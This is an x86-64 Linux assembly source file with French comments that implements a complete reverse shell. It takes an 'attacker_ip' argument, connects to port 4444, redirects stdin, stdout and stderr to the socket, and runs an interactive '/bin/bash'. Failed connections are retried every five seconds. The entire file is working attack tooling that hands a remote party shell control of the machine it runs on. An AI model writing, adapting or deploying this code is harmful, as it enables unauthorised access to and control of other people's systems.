section .data
    ; Commandes et arguments
    command      db '/bin/bash',0
    bash_i       db '-i',0
    bash_args    dq command, bash_i, 0
    
    ; Messages d'erreur
    err_usage    db 'Usage: ./reverse <attacker_ip>',10,0
    err_ip_format db 'Error: Invalid IP format',10,0
    err_socket   db 'Error: Socket creation failed',10,0
    err_connect  db 'Error: Connection failed',10,0
    timespec     dq 5, 0          ; 5 secondes entre les tentatives    
    ; Port fixe
    port_num     dw 4444

section .bss
    ip_bytes     resd 1           ; IP en format réseau
    port_bytes   resw 1           ; Port en format réseau
    sockaddr     resb 16          ; Structure sockaddr_in
    envp         resq 256         ; Tableau des variables d'environnement

section .text
    global _start

;----------------------------------------------------------
; Validation et conversion de l'IP
; Entrée : rdi = pointeur vers la chaîne IP
; Sortie : rax = 1 (succès), 0 (erreur)
;----------------------------------------------------------
validate_and_parse_ip:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    push r13
    
    mov rsi, rdi
    xor rbx, rbx                  ; Compteur d'octets
    xor r12d, r12d                ; IP accumulée
    xor r13d, r13d                ; Valeur d'octet courante

.parse_loop:
    movzx edx, byte [rsi]
    test dl, dl
    jz .end_parse
    
    cmp dl, '.'
    je .store_octet
    
    cmp dl, '0'
    jb .invalid
    cmp dl, '9'
    ja .invalid
    
    sub dl, '0'
    imul r13d, r13d, 10
    add r13d, edx
    cmp r13d, 255
    ja .invalid
    
    inc rsi
    jmp .parse_loop

.store_octet:
    cmp bl, 3                     ; Vérifier nombre d'octets
    jae .invalid
    
    shl r12d, 8
    or r12d, r13d
    inc bl
    xor r13d, r13d
    inc rsi
    jmp .parse_loop

.end_parse:
    cmp bl, 3                     ; Doit avoir exactement 3 points (4 octets)
    jne .invalid
    
    shl r12d, 8
    or r12d, r13d
    ; Convertir en format réseau (big-endian)
    mov eax, r12d
    bswap eax
    mov [ip_bytes], eax
    mov rax, 1
    jmp .done

.invalid:
    xor rax, rax
.done:
    pop r13
    pop r12
    pop rbx
    pop rbp
    ret

jmp_arg:
    ; Boucle sur les arguments présents dans la stack jusqu'à arriver à NULL
    mov rax, [rbx]
    add rbx, 8
    test rax, rax
    jnz jmp_arg
    ret

jmp_envp:
    lea rdi, [envp]
env_loop:
    ; Boucle sur les variables d'environnement présentes dans la stack jusqu'à arriver à NULL
    mov rax, [rbx]
    test rax, rax
    je done
    mov [rdi], rax
    add rdi, 8
    add rbx, 8
    jmp env_loop
done:
    ; Fin du tableau avec NULL
    mov qword [rdi], 0
    ret

;----------------------------------------------------------
; Programme principal
;----------------------------------------------------------
_start:
    mov rbx, rsp
    
    pop rcx                       ; argc
    cmp rcx, 2
    jne usage_error

    call jmp_arg
    call jmp_envp
    
    pop rsi                       ; argv[0]
    pop rdi                       ; argv[1] (IP)
    
    call validate_and_parse_ip
    test rax, rax
    jz ip_error

    ; Convertir le port en format réseau
    mov ax, [port_num]
    xchg al, ah                   ; Conversion en big-endian
    mov [port_bytes], ax

connection_loop:
    ; Création du socket
    mov rax, 41                   ; sys_socket
    mov rdi, 2                    ; AF_INET
    mov rsi, 1                    ; SOCK_STREAM
    xor rdx, rdx                  ; Protocole par défaut
    syscall 
    
    test rax, rax
    js socket_error
    mov r8, rax                   ; Sauvegarder le socket fd

    ; Configuration de la structure sockaddr_in
    lea rdi, [sockaddr]
    mov word [rdi], 2             ; AF_INET
    mov ax, [port_bytes]
    mov word [rdi+2], ax          ; Port en big-endian
    mov eax, [ip_bytes]
    mov dword [rdi+4], eax        ; IP en big-endian
    mov qword [rdi+8], 0          ; Padding

    ; Connexion
    mov rax, 42                   ; sys_connect
    mov rdi, r8                   ; socket fd
    lea rsi, [sockaddr]           ; sockaddr_in
    mov rdx, 16                   ; addrlen
    syscall
    
    test rax, rax
    js connect_error

    ; Redirection des flux standard (stdin, stdout, stderr)
    xor rsi, rsi
.dup_loop:
    mov rax, 33                   ; sys_dup2
    mov rdi, r8                   ; socket fd
    ; rsi contient déjà 0, 1, ou 2
    syscall
    inc rsi
    cmp rsi, 3
    jne .dup_loop

    ; Exécution du shell
    mov rax, 59                   ; sys_execve
    lea rdi, [command]
    lea rsi, [bash_args]
    lea rdx, [envp]
    syscall

    ; En cas d'échec d'execve
    jmp exit_program

;----------------------------------------------------------
; Gestion des erreurs
;----------------------------------------------------------
usage_error:
    mov rax, 1                    ; sys_write
    mov rdi, 2                    ; stderr
    lea rsi, [err_usage]
    mov rdx, 30
    syscall
    jmp exit_program

ip_error:
    mov rax, 1                    ; sys_write
    mov rdi, 2                    ; stderr
    lea rsi, [err_ip_format]
    mov rdx, 25
    syscall
    jmp exit_program

socket_error:
    mov rax, 1                    ; sys_write
    mov rdi, 2                    ; stderr
    lea rsi, [err_socket]
    mov rdx, 28
    syscall
    jmp exit_program

connect_error:
    ; Fermer le socket avant de réessayer
    mov rax, 3                    ; sys_close
    mov rdi, r8
    syscall

    ; Attendre avant de réessayer
    mov rax, 35                   ; sys_nanosleep
    lea rdi, [timespec]
    xor rsi, rsi
    syscall
    jmp connection_loop

exit_program:
    mov rax, 60                   ; sys_exit
    mov rdi, 1                    ; code de sortie
    syscall